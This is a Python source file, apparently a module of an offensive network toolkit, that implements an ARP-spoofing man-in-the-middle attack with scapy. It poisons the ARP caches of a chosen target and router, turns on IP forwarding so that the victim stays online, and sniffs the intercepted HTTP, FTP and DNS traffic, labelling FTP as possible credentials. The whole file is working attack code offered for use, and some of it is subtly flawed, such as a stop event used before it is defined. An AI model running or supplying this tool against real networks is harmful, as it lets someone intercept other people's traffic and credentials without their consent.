import os
import time
import threading
from scapy.all import ARP, send, Ether, srp, IP, TCP, UDP, sniff
from rich.console import Console
from core.ui import draw_header

console = Console()

def toggle_forwarding(state=True):
    """Enables or disables IP forwarding on the host OS."""
    value = 1 if state else 0
    try:
        if os.uname().sysname == 'Darwin': # macOS
            os.system(f"sudo sysctl -w net.inet.ip.forwarding={value} > /dev/null")
        else: # Linux
            os.system(f"echo {value} | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null")
    except:
        console.print("[yellow][!] Manual IP forwarding check required.[/yellow]")

def get_mac(ip):
    """Resolves MAC address for a given IP."""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
    except:
        return None

def packet_callback(packet):
    """Sniffs and displays interesting data from the intercepted stream."""
    if packet.haslayer(IP):
        # Filter for common interesting unencrypted protocols
        if packet.haslayer(TCP):
            port = packet[TCP].dport
            if port == 80:
                console.print(f"[bold cyan][HTTP][/bold cyan] {packet[IP].src} -> {packet[IP].dst} (Web Traffic)")
            elif port == 21:
                console.print(f"[bold red][FTP][/bold red] {packet[IP].src} -> {packet[IP].dst} (Possible Credentials)")
        elif packet.haslayer(UDP) and packet[UDP].dport == 53:
            console.print(f"[bold magenta][DNS][/bold magenta] {packet[IP].src} is looking for a domain.")

def start_mitm():
    draw_header("MITM Engine v2.0")
    target = console.input("[bold yellow]Target IP: [/bold yellow]").strip()
    router = console.input("[bold yellow]Router IP: [/bold yellow]").strip()

    if not target or not router: return

    console.print("[bold blue][*][/bold blue] Resolving MAC addresses and preparing interceptor...")
    t_mac = get_mac(target)
    r_mac = get_mac(router)

    if not t_mac or r_mac is None:
        console.print("[red]Failure: Could not resolve MAC. Is the target online?[/red]")
        return

    # 1. Enable IP Forwarding so the victim stays online
    toggle_forwarding(True)
    
    console.print(f"[bold red][!] Intercepting: {target} <--> {router}[/bold red]")
    console.print("[dim]Packet sniffer active. Press CTRL+C to stop and restore network.[/dim]\n")

    # 2. Start Sniffer in a separate thread
    sniff_thread = threading.Thread(target=lambda: sniff(prn=packet_callback, store=0, stop_filter=lambda p: stop_event.is_set()))
    stop_event = threading.Event()
    sniff_thread.start()

    try:
        while True:
            # Poison Target: Tell target I am the router
            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=router), verbose=False)
            # Poison Router: Tell router I am the target
            send(ARP(op=2, pdst=router, hwdst=r_mac, psrc=target), verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        stop_event.set()
        console.print("\n[yellow][*] Restoring network integrity...[/yellow]")
        toggle_forwarding(False)
        # Re-ARPing correctly to fix the target's cache
        send(ARP(op=2, pdst=target, hwdst="ff:ff:ff:ff:ff:ff", psrc=router, hwsrc=r_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=router, hwdst="ff:ff:ff:ff:ff:ff", psrc=target, hwsrc=t_mac), count=5, verbose=False)
        console.print("[green][+] Network restored. MITM Session Closed.[/green]")
        input("\nPress Enter to return...")